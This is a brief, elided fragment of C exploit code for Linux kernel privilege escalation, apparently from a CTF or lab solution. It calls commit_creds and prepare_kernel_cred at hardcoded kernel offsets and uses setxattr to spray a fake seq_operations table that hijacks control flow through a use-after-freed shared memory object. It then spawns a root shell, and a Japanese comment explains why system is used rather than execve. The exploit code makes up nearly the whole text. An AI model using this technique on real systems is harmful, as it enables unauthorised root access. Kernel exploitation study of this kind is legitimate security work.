...
void *get_root() {
  ...
  commit_creds_t commit_creds = (commit_creds_t)(kbase + 0x077180UL);
  prepare_kernel_cred_t prepare_kernel_cred =
      (prepare_kernel_cred_t)(kbase + 0x077320UL);
...
#define SETXATTR_FILE_NAME "/tmp/setxattrf"
  ...
  ulong fake_seq_ops[4] = {0};
  fake_seq_ops[0] = (ulong)get_root;
  fake_seq_ops[1] = (ulong)nop;
  setxattr(SETXATTR_FILE_NAME, "ABCDEFG", fake_seq_ops, 0x20, 0);
  printf("[+] get_root @ %p\n", get_root);
  ...
  // NOTE:
  // `execve`を使うとshmが閉じられてしまうが、shmはUAFされているためおそらくエラーになる
  system("/bin/sh");
